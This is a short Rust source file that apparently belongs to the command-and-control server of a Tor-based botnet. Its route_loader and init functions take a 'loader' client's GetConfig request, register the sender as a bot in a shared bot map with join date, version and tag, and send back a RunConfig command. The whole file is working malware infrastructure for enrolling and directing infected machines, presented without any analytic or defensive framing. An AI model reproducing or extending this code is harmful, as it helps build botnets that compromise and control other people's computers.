use std::{ collections::HashMap, sync::Arc };
use chrono::Utc;
use loader_vars::types::{
    receive::{ ClientAction, ClientParams, RunConfigParams },
    send::{ LoaderSendPayload, ServerAction, ServerParams },
};
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use super::{
    sanitization::verify_loader_get_config,
    tor::{ Bot, LoaderInstance, TorServerHandler },
};
use anyhow::Result;

pub async fn route_loader(
    handler: &TorServerHandler,
    payload: LoaderSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::GetConfig => { init(handler, payload, stream_ref).await }
    }
}

pub async fn init(
    handler: &TorServerHandler,
    payload: LoaderSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::GetConfig(params) = payload.params {
        verify_loader_get_config(&params)?;
        let mut bot_map = handler.bot_map.write().await;
        let bot = bot_map.entry(payload.id.clone()).or_insert(Bot::new(payload.id));

        bot.loader_instances.push(LoaderInstance {
            join_date: Utc::now().to_string(),
            version: payload.version,
            tag: params.tag,
        });

        drop(bot_map);
        TorServerHandler::send_action_to_loader(
            stream_ref,
            ClientAction::RunConfig,
            ClientParams::RunConfig(RunConfigParams::default())
        ).await
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
